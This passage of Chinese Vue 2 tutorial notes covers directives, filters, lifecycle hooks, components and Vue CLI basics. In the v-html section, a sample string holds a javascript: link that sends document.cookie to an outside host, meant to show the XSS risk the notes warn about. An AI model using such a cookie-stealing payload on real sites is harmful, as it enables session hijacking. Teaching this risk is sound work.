<input v-model.lazy="msg">
```



#### .number



如果想自动将用户的输入值转为数值类型，可以给 `v-model` 添加 `number` 修饰符：

```java
<input v-model.number="age" type="number">
```

这通常很有用，因为即使在 `type="number"` 时，HTML 输入元素的值也总会返回字符串。如果这个值无法被 `parseFloat()` 解析，则会返回原始的值。



#### .trim



如果要自动过滤用户输入的首尾空白字符，可以给 `v-model` 添加 `trim` 修饰符：

```java
<input v-model.trim="msg">
```



## 4.8：过滤器



Vue.js 允许你自定义过滤器，可被用于一些常见的文本格式化。过滤器可以用在两个地方：**双花括号插值和 `v-bind` 表达式** (后者从 2.1.0+ 开始支持)。过滤器应该被添加在 JavaScript 表达式的尾部，由“管道”符号指示：



```java
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="../js/dayjs.min.js"></script>
	</head>
	<body>
		<!-- 
			过滤器：
				定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
				语法：
						1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
						2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
				备注：
						1.过滤器也可以接收额外参数、多个过滤器也可以串联
						2.并没有改变原本的数据, 是产生新的对应的数据
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>显示格式化后的时间</h2>
			<!-- 计算属性实现 -->
			<h3>现在是：{{fmtTime}}</h3>
			<!-- methods实现 -->
			<h3>现在是：{{getFmtTime()}}</h3>
			<!-- 过滤器实现 -->
			<h3>现在是：{{time | timeFormater}}</h3>
			<!-- 过滤器实现（传参） -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
			<h3 :x="msg | mySlice"></h3>
		</div>

		<div id="root2">
			<h2>{{msg | mySlice}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})
		
		new Vue({
			el:'#root',
			data:{
				time:1621561377603, //时间戳
				msg:'你好'
			},
			computed: {
				fmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			methods: {
				getFmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			//局部过滤器
			filters:{
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					// console.log('@',value)
					return dayjs(value).format(str)
				}
			}
		})

		new Vue({
			el:'#root2',
			data:{
				msg:'hello,xht!'
			}
		})
	</script>
</html>
```





## 4.9：v-text



### 1.简介



1.作用：向其所在的节点中渲染文本内容。(如果有html标签的话，是不会去渲染html)

2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。



### 2.代码



```java
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>demo</title>
  <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
  <h1>hello {{name}}</h1>
  <h1 v-text="name">hello </h1>
  <h1 v-text="str">hello </h1>
</div>
</body>

<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      name:'小糊涂',
      str:'<h3>你好啊！</h3>'
    }
  })
</script>
</html>
```





### 3.案例



<img src="images/image-20211221113301541.png" alt="image-20211221113301541" style="zoom:80%;" />





## 4.10：v-html





### 1.简介



+ 作用：向指定节点中渲染包含html结构的内容。

+ 与插值语法的区别：
  + v-html会替换掉节点中所有的内容，{{xx}}则不会。
  + v-html可以识别html结构。

+ 严重注意：v-html有安全性问题！！！！
  + 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
  + 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！



### 2.代码





```java
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
```



### 3.案例



<img src="images/image-20211221113912313.png" alt="image-20211221113912313" style="zoom:80%;" />



# 五、VUE基础(三)





## 5.1：v-cloak



### 1.简介



这个指令保持在元素上直到关联实例结束编译。和 CSS 规则如 `[v-cloak] { display: none }` 一起用时，这个指令可以隐藏未编译的 Mustache 标签直到实例准备完毕。

1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
      2.使用css配合v-cloak**可以解决网速慢时页面展示出{{xxx}}的问题。**



### 2.代码



```java
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>v-cloak指令</title>
  <style>
    [v-cloak]{
      display:none;
    }
  </style>
  <!-- 引入Vue -->
</head>
<body>
<!--
        v-cloak指令（没有值）：
                1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
                2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
-->
<!-- 准备好一个容器-->
<div id="root">
  <h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script><!--没有这个服务-->
</body>

<script type="text/javascript">
  console.log(1)
  Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

  new Vue({
    el:'#root',
    data:{
      name:'尚硅谷'
    }
  })
</script>
</html>
```



### 3.测试



打开网页一片空白



## 5.2：v-once



### 1.简介



1.v-once所在节点在初次动态渲染后，就视为静态内容了。

2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

> 只渲染元素和组件**一次**。随后的重新渲染，元素/组件及其所有的子节点将被视为静态内容并跳过。这可以用于优化更新性能。



### 2.代码



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>v-once指令</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<!--
    v-once指令：
                1.v-once所在节点在初次动态渲染后，就视为静态内容了。
                2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
-->
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-once>初始化的n值是:{{n}}</h2>
    <h2>当前的n值是:{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
</html>
```



### 3.测试





<img src="images/image-20211221114535850.png" alt="image-20211221114535850" style="zoom:80%;" />



### 4.注意



v-once和@click.once是不一样的，一个是事件修饰符，一个是标签



## 5.3：v-pre



### 1.简介



+ 1.跳过其所在节点的编译过程。
+ 2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。



### 2.代码



```java
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			v-pre指令：
					1.跳过其所在节点的编译过程。
					2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2 >当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```



### 3.测试



<img src="images/image-20211221115302895.png" alt="image-20211221115302895" style="zoom:80%;" />

## 5.4：自定义指令



### 1.简介



```java
需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
自定义指令总结：
一、定义语法：
(1).局部指令：
new Vue({							new Vue({
directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
}) 									})
(2).全局指令：
Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)

二、配置对象中常用的3个回调：
(1).bind：指令与元素成功绑定时调用。
(2).inserted：指令所在元素被插入页面时调用。
(3).update：指令所在模板结构被重新解析时调用。

三、备注：
1.指令定义时不加v-，但使用时要加v-；
2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
```





### 2.代码





```java
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令
		/* Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

		new Vue({
			el:'#root',
			data:{
				name:'小糊涂',
				n:1
			},
			directives:{
				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
				/* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
				big(element,binding){
					console.log('big',this) //注意此处的this是window
					// console.log('big')
					element.innerText = binding.value * 10
				},
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						element.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
		
	</script>
</html>
```







## 5.6：生命周期





### 1.简介



每个`Vue`实例在被创建时都要经过一系列的初始化过程，例如：需要设置数据的监听，编译模板，将实例挂载到`DOM`上，并且在数据变化时更新`DOM`等，这些过程统称为`Vue`实例的`生命周期`。同时在这个过程中也会运行一些叫做**生命周期钩子**的函数，这给了用户在不同阶段添加自己的代码的机会。

其实`Vue`实例的生命周期，主要分为三个阶段，每个阶段都会执行不同的钩子函数，分别为

- 挂载(初始化相关属性,例如`watch`属性，`method`属性)

  1. `beforeCreate`
  2. `created`
  3. `beforeMount`
  4. `mounted`

- 更新(元素或组件的变更操作)

  1. `beforeUpdate`
  2. `updated`

- 销毁（销毁相关属性）

- 1. `beforeDestroy`
  2. `destroyed`



### 2.图视





<img src="images/生命周期.png" alt="生命周期" style="zoom:80%;" />

### 3.钩子函数简介



所有生命周期钩子的 `this` 上下文将自动绑定至实例中，因此你可以访问 data、computed 和 methods。这意味着**你不应该使用箭头函数来定义一个生命周期方法** (例如 `created: () => this.fetchTodos()`)。因为箭头函数绑定了父级上下文，所以 `this` 不会指向预期的组件实例，并且`this.fetchTodos` 将会是 undefined。



### 4.beforeCreate



- **类型**：`Function`

- **详细**：

  在实例初始化之后,进行数据侦听和事件/侦听器的配置之前同步调用。

- **参考**：[生命周期图示](#2.图视)



### 5.created



- **类型**：`Function`

- **详细**：

  在实例创建完成后被立即同步调用。在这一步中，实例已完成对选项的处理，意味着以下内容已被配置完毕：数据侦听、计算属性、方法、事件/侦听器的回调函数。然而，挂载阶段还没开始，且 `$el` property 目前尚不可用。

- **参考**：[生命周期图示](#2.图视)



### 6.beforeMount



- **类型**：`Function`

- **详细**：

  在挂载开始之前被调用：相关的 `render` 函数首次被调用。

  **该钩子在服务器端渲染期间不被调用。**

- **参考**：[生命周期图示](#2.图视)



### 7.mounted



- **类型**：`Function`

- **详细**：

  实例被挂载后调用，这时 `el` 被新创建的 `vm.$el` 替换了。如果根实例挂载到了一个文档内的元素上，当 `mounted` 被调用时 `vm.$el` 也在文档内。

  注意 `mounted` **不会**保证所有的子组件也都被挂载完成。如果你希望等到整个视图都渲染完毕再执行某些操作，可以在 `mounted` 内部使用 [vm.$nextTick](https://cn.vuejs.org/v2/api/#vm-nextTick)：

  ```java
  mounted: function () {
    this.$nextTick(function () {
      // 仅在整个视图都被渲染之后才会运行的代码
    })
  }
  ```

  **该钩子在服务器端渲染期间不被调用。**

- **参考**：[生命周期图示](#2.图视)





### 8.beforeUpdate



- **类型**：`Function`

- **详细**：

  在数据发生改变后，DOM 被更新之前被调用。这里适合在现有 DOM 将要被更新之前访问它，比如移除手动添加的事件监听器。

  **该钩子在服务器端渲染期间不被调用，因为只有初次渲染会在服务器端进行。**

- **参考**：[生命周期图示](#2.图视)



### 9.updated



- **类型**：`Function`

- **详细**：

  在数据更改导致的虚拟 DOM 重新渲染和更新完毕之后被调用。

  当这个钩子被调用时，组件 DOM 已经更新，所以你现在可以执行依赖于 DOM 的操作。然而在大多数情况下，你应该避免在此期间更改状态。如果要相应状态改变，通常最好使用[计算属性](https://cn.vuejs.org/v2/api/#computed)或 [watcher](https://cn.vuejs.org/v2/api/#watch) 取而代之。

  注意，`updated` **不会**保证所有的子组件也都被重新渲染完毕。如果你希望等到整个视图都渲染完毕，可以在 `updated` 里使用 [vm.$nextTick](https://cn.vuejs.org/v2/api/#vm-nextTick)：

  ```js
  updated: function () {
    this.$nextTick(function () {
      //  仅在整个视图都被重新渲染之后才会运行的代码     
    })
  }
  ```

  **该钩子在服务器端渲染期间不被调用。**

- **参考**：[生命周期图示](#2.图视)



### 10.activated



- **类型**：`Function`

- **详细**：

  被 keep-alive 缓存的组件激活时调用。

  **该钩子在服务器端渲染期间不被调用。**

- **参考**：

  - [构建组件 - keep-alive](https://cn.vuejs.org/v2/api/#keep-alive)
  - [动态组件 - keep-alive](https://cn.vuejs.org/v2/guide/components-dynamic-async.html#在动态组件上使用-keep-alive)



### 11.deactivated



- **类型**：`Function`

- **详细**：

  被 keep-alive 缓存的组件失活时调用。

  **该钩子在服务器端渲染期间不被调用。**

- **参考**：

  - [构建组件 - keep-alive](https://cn.vuejs.org/v2/api/#keep-alive)
  - [动态组件 - keep-alive](https://cn.vuejs.org/v2/guide/components-dynamic-async.html#在动态组件上使用-keep-alive)



### 12.beforeDestroy



- **类型**：`Function`

- **详细**：

  实例销毁之前调用。在这一步，实例仍然完全可用。

  **该钩子在服务器端渲染期间不被调用。**

- **参考:**[生命周期图示](#2.图视)



### 13.destroyed



- **类型**：`Function`

- **详细**：

  实例销毁后调用。该钩子被调用后，对应 Vue 实例的所有指令都被解绑，所有的事件监听器被移除，所有的子实例也都被销毁。

  **该钩子在服务器端渲染期间不被调用。**

- **参考**：[生命周期图示](#2.图视)



### 14.errorCaptured



> 2.5.0+ 新增

- **类型**：`(err: Error, vm: Component, info: string) => ?boolean`

- **详细**：

  在捕获一个来自后代组件的错误时被调用。此钩子会收到三个参数：错误对象、发生错误的组件实例以及一个包含错误来源信息的字符串。此钩子可以返回 `false` 以阻止该错误继续向上传播。

  你可以在此钩子中修改组件的状态。因此在捕获错误时，在模板或渲染函数中有一个条件判断来绕过其它内容就很重要；不然该组件可能会进入一个无限的渲染循环。

  **错误传播规则**

  - 默认情况下，如果全局的 `config.errorHandler` 被定义，所有的错误仍会发送它，因此这些错误仍然会向单一的分析服务的地方进行汇报。
  - 如果一个组件的 inheritance chain (继承链)或 parent chain (父链)中存在多个 `errorCaptured` 钩子，则它们将会被相同的错误逐个唤起。
  - 如果此 `errorCaptured` 钩子自身抛出了一个错误，则这个新错误和原本被捕获的错误都会发送给全局的 `config.errorHandler`。
  - 一个 `errorCaptured` 钩子能够返回 `false` 以阻止错误继续向上传播。本质上是说“这个错误已经被搞定了且应该被忽略”。它会阻止其它任何会被这个错误唤起的 `errorCaptured` 钩子和全局的 `config.errorHandler`。



# 六、组件化编程



## 6.1：组件化是什么



vue.js组件化用于将UI页面分割为若干组件进行组合和嵌套；组件化是一种高效的处理复杂应用系统，更好的明确功能模块作用的方式；目的是为了解耦，把复杂系统拆分成多个组件，分离组件边界和责任，便于独立升级和维护。

我们[可以从vue官方视频简介中看到：](https://player.youku.com/embed/XMzMwMTYyODMyNA==?autoplay=true&client_id=37ae6144009e277d)

1. 理解: 向外提供特定功能的 js 程序, 一般就是一个 js 文件 

2. 为什么: js 文件很多很复杂 

3. 作用: 复用 js, 简化 js 的编写, 提高 js 运行效率



> **<font color='red'>注意</font>**
>
> 1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
>
> 2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。



## 6.2：文件组件类别



### 1.非单文件组件



文件中有多个组件



### 2.单文件组件



文件中有一个组件



详情看下：





## 6.3：学习前准备的模板



这个模块我们将拆成组件，共拆分三块：





```java
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>demo</title>
  <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
  <h1>hello {{name}}</h1>
  <h2>学校详细</h2>
  <h3>学校名称:{{school.name}}</h3>
  <h3>学校地址:{{school.address}}</h3>
  <h2>学生明细</h2>
  <h3 v-for="item in students" :key="item.name">{{item.name}},{{item.age}},{{item.class}}</h3>
</div>
</body>

<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      name:'小糊涂',
      school: {
        name:'小糊涂大学',
        address: '天府之国',
      },
      students: [
        { name:'admin',age:18,class: '一年级'},
        { name:'张三',age:18,class: '三年级'},
        { name:'李四',age:18,class: '三年级'},
        { name:'王五',age:18,class: '三年级'},
      ]
    }
  })
</script>
</html>
```



## 6.4：helloworld



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <hello></hello>
</div>
</body>

<script type="text/javascript">
    /*定义一个组件*/
    Vue.component('hello', {
        data: function () {
            return {
                name: '小糊涂'
            }
        },
        template: '<h1>hello {{name}}</h1>'
    })
    /*实例化vue*/
    new Vue({
        el: '#root'
    });

</script>
</html>
```





## 6.5：helloword的另一种写法



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <hello></hello>
    <school></school>
</div>
</body>

<script type="text/javascript">
    //定义school组件
    const school = Vue.extend({
        name:'school',
        template:`
				<div>
					<h2>学校名称：{{name}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>
				</div>
			`,
        data(){
            return {
                name:'尚硅谷',
                address:'北京'
            }
        },
        methods: {
            showName(){
                console.log('showName',this)
            }
        },
    });

    /*定义一个组件*/
    Vue.component('hello', {
        data: function () {
            return {
                name: '小糊涂'
            }
        },
        template: '<h1>hello {{name}}</h1>'
    })
    /*实例化vue*/
    new Vue({
        el: '#root',
        components:{school}
    });

</script>
</html>
```





## 6.6：两种helloworld对比



第一种我们定义的是不需要引用既可以使用（全局注册）

第二种我们定义的需要引用既可以使用（局部注册）

我们推荐使用第二种：**（注意了我们使用下面这种时一定要注意模块代码必须有一个父级元素，负责会出错。）**

```java
   //定义school组件
    const school = Vue.extend({
        name:'school',
        template:`
				<div>
					<h2>学校名称：{{name}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>
				</div>
			`,
        data(){
            return {
                name:'尚硅谷',
                address:'北京'
            }
        },
        methods: {
            showName(){
                console.log('showName',this)
            }
        },
    });
```





## 6.7：非单文件组件



[模板](#6.3：学习前准备的模板)在上面，我们那模板来拆分



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <hello></hello>
    <school></school>
    <student></student>
</div>
</body>

<script type="text/javascript">
    const a = Vue.extend({
        name: 'x',
        data() {
            return {
                name:'小糊涂',
            }
        },
        template: `<h1>hello {{name}}</h1>`
    });
    const b = Vue.extend({
        name: 'y',
        data() {
            return {
                school: {
                    name: '小糊涂大学',
                    address: '天府之国',
                }
            }
        },
        template: `<div><h2>学校详细</h2>
        <h3>学校名称:{{school.name}}</h3>
        <h3>学校地址:{{school.address}}</h3></div>  `
    });
    const c = Vue.extend({
        name: 'z',
        data() {
            return {
                students: [
                    { name:'admin',age:18,class: '一年级'},
                    { name:'张三',age:18,class: '三年级'},
                    { name:'李四',age:18,class: '三年级'},
                    { name:'王五',age:18,class: '三年级'},
                ]
            }
        },
        template: ` <div> <h2>学生明细</h2>
        <h3 v-for="item in students" :key="item.name">{{item.name}},{{item.age}},{{item.class}}</h3></div>  `
    })
    /*实例化vue*/
    new Vue({
        el: '#root',
        components: {
            hello:a,
            school: b,
            student: c

        }
    });

</script>
</html>
```



## 6.8：非单文件组件总结



不要说我上面变量名字的拉跨，观察下面的关系，更好的理解



<img src="images/image-20211221171022880.png" alt="image-20211221171022880" style="zoom:80%;" />





## 6.9：组件嵌套



[这里的代码我们是根据](#6.7：单文件组件)修改的

我们想要的效果如下：

<img src="images/image-20211221173524045.png" alt="image-20211221173524045" style="zoom:80%;" />



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <app></app>
</div>
</body>

<script type="text/javascript">
    const a = Vue.extend({
        name: 'hellos',
        data() {
            return {
                name: '小糊涂',
            }
        },
        template: `<h1>hello {{ name }}</h1>`
    });
    const c = Vue.extend({
        name: 'students',
        data() {
            return {
                students: [
                    {name: 'admin', age: 18, class: '一年级'},
                    {name: '张三', age: 18, class: '三年级'},
                    {name: '李四', age: 18, class: '三年级'},
                    {name: '王五', age: 18, class: '三年级'},
                ]
            }
        },
        template: `
          <div><h2>学生明细</h2>
          <h3 v-for="item in students" :key="item.name">{{ item.name }},{{ item.age }},{{ item.class }}</h3></div>  `
    });
    const b = Vue.extend({
        name: 'schools',
        data() {
            return {
                school: {
                    name: '小糊涂大学',
                    address: '天府之国',
                }
            }
        },
        template: `
          <div><h2>学校详细</h2>
          <h3>学校名称:{{ school.name }}</h3>
          <h3>学校地址:{{ school.address }}</h3>
          <student></student>
          </div>
        `,
        components: {
            student: c
        }
    });
    const app = Vue.extend({
        components: {
            hello: a,
            school: b
        },
        template:
                `
                  <div>
                  <hello></hello>
                  <school></school>
                  </div>`
    });

    /*实例化vue*/
    new Vue({
        el: '#root',
        components: {app:app}
    });

</script>
</html>
```



## 6.10：关于VueComponent



```java
关于VueComponent：
		1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
 		2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。
		3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！
		4.关于this指向：
			(1).组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
			(2).new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

		5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
		6.Vue的实例对象，以后简称vm。
```


## 6.11：单文件组件



### 1.创建App.vue



```java
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>

```



### 2.创建index.html



```java
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>练习一下单文件组件的语法</title>
	</head>
	<body>
		<!-- 准备一个容器 -->
		<div id="root"></div>
		 <script type="text/javascript" src="../js/vue.js"></script>
		 <script type="text/javascript" src="./main.js"></script>
	</body>
</html>

```



### 3.创建main.js



```java
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```



### 4.创建School.vue



```java
<template>
  <div><h2>学校详细</h2>
    <h3>学校名称:{{ school.name }}</h3>
    <h3>学校地址:{{ school.address }}</h3>
    <student></student>
  </div>
</template>

<script>
	 export default {
		name:'School',
		data(){
			return {
        school: {
          name: '小糊涂大学',
          address: '天府之国',
        }
			}
		}
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```



### 5.创建Student.vue



```java
<template>
  <template>
    <h2>学生明细</h2>
    <h3 v-for="item in students" :key="item.name">{{ item.name }},{{ item.age }},{{ item.class }}</h3>
  </template>
</template>

<script>
export default {
  name: "Students",
  data() {
    return {
      students: [
        {name: 'admin', age: 18, class: '一年级'},
        {name: '张三', age: 18, class: '三年级'},
        {name: '李四', age: 18, class: '三年级'},
        {name: '王五', age: 18, class: '三年级'},
      ]
    }
  }
}
</script>

<style scoped>

</style>
```





### 6.测试



现在是无法执行的，必须配合脚手架



# 七、VUE脚手架(一）



## 7.1：简介



### 1.简介



你可以使用 `vue serve` 和 `vue build` 命令对单个 `*.vue` 文件进行快速原型开发，不过这需要先额外安装一个全局的扩展：

```java
npm install -g @vue/cli-service-global
```

`vue serve` 的缺点就是它需要安装全局依赖，这使得它在不同机器上的一致性不能得到保证。因此这只适用于快速原型开发。



### 2.创建一个项目



```java
vue create vue-test
```



然后选择自己需要的配置即可：

<img src="images/image-20211221193049159.png" alt="image-20211221193049159" style="zoom:80%;" />



进入项目中运行：

```java
npm run serve
```



<img src="images/image-20211221193259377.png" alt="image-20211221193259377" style="zoom:80%;" />





### 3.vue-cli目录分析



```java
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```





## 7.2：修改默认配置项



### 1.显示webpack配置文件



Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpakc 配置， 

请执行：

```java
vue inspect > output.js
```



### 2.vue.config.js



`vue.config.js` 是一个可选的配置文件，如果项目的 (和 `package.json` 同级的) 根目录中存在这个文件，那么它会被 `@vue/cli-service` 自动加载。你也可以使用 `package.json` 中的 `vue` 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写。

这个文件应该导出一个包含了选项的对象：

```java
// vue.config.js

/**
 * @type {import('@vue/cli-service').ProjectOptions}
 */
module.exports = {
  // 选项...
}
```



### 3.修改入口函数



我们知道vue脚手架的入口函数是`main.js`，我们现在想修改可以在`vue.conf.js`中这样写

```java
// vue.config.js
module.exports = {
    /*入口js*/
    pages: {
        index: {
            //入口
            entry: 'src/myMain.js',
        },
    },
}
```



### 4.总结



1. 使用vue inspect > output.js可以查看到Vue脚手架的默认配置。
2. 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh/config/

现用现查

<img src="images/image-20211221203608558.png" alt="image-20211221203608558" style="zoom:80%;" />





## 7.3：组件之间的通信



| 方式                                    | 描述                                                         | 备注                                                         |
| --------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| [ref](#7.4：ref属性(id替代者))          | 我们可以叫他为id的替换者，如果绑定的是html的话，那么可以进行DOM操作，如果绑定的是组件的话是可以修改数据 | 父组件更改子组件的内容**(只限ref绑定在组件上)**，如果绑定的html，那么就是操作dom元素了 |
| [props](#7.5：props配置项)              | 用于接收父组件传过来的值，并且可以对值的类型做限制           | 不可以修改父组件的值，如若修改数据请复制数据到`data`里面，**但是不会影响父组件的数据** |
|                                         | 用于接收父组件的方法                                         | 子组件可以调用父组件的方法，然后父组件去修改自身的数据，**以达到子组件修改父组件的数据** |
| [mixin](#7.6：mixin混入)                | 可以把多个组件共用的配置提取成一个混入对象                   | 可以修改数据，但是只影响当前使用的组件里面的数据，因为混入会进行数据合并，把公共的数据变成组件自己的数据 |
| [插件](#7.7：插件)                      | 用于增强Vue                                                  | 一个库，提供自己的 API，同时提供上面提到的一个或多个功能，例如我们将要学习的插件(elementui) |
| [scoped](#7.8：scoped(CSS样式))         | 用于css的隔离防止css的定义全局                               | 让样式在局部生效，防止冲突。                                 |
| [自定义事件](#7.10：组件间的自定义事件) | [绑定自定义事件`$on`](#3.绑定自定义事件)<br>[触发自定义事件`$emit`](#4.触发自定义事件)<br>[解绑自定义事件`$off`](#5.解绑自定义事件)<br>[销毁自定义事件](#6.销毁自定义事件)这里的销毁是生命周期里面的 | 只能用于组件上，类似props，将方法传递给子组件，然后子组件把数据给父组件，不同于props的是，不能将数据传递 |





## 7.4：ref属性(id替代者)



> 都已经组件化编码了，你就不要再使用`document.getElementById('')`来获取dom元素了，来使用`ref吧`



### 1.简介



1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3. 使用方式：
   1. 打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
   2. 获取：```this.$refs.xxx```



### 2.案例

> (App.vue)

```java
<template>
  <div>
    <h1 v-text="msg" ref="hello"></h1>
    <button @click="show" ref="btn">点击我一下，然后看控制台打印</button>
    <schools ref="school"></schools>
  </div>
</template>
